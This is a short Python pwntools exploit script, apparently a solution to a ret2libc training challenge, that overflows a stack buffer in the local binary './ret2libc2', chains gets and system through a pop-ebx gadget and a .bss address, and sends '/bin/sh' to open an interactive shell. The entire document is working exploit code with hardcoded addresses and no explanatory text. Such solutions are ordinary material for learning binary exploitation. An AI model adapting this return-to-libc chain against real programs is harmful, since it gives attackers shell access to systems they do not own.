from pwn import *
sh = process('./ret2libc2')
esp = 0xffffd260
ebp = 0xffffd2e8
s_offset = 0x1c
system_addr = 0x08048490
gets_addr = 0x08048460
bss_addr = 0x0804A060
pop_ebx_ret = 0x0804843d
payload = flat(
			[b'A' * (ebp-esp-s_offset+4), gets_addr, pop_ebx_ret, bss_addr, system_addr, b'A'*4, bss_addr]
		)
sh.sendline(payload)
sh.sendline('/bin/sh')
sh.interactive()
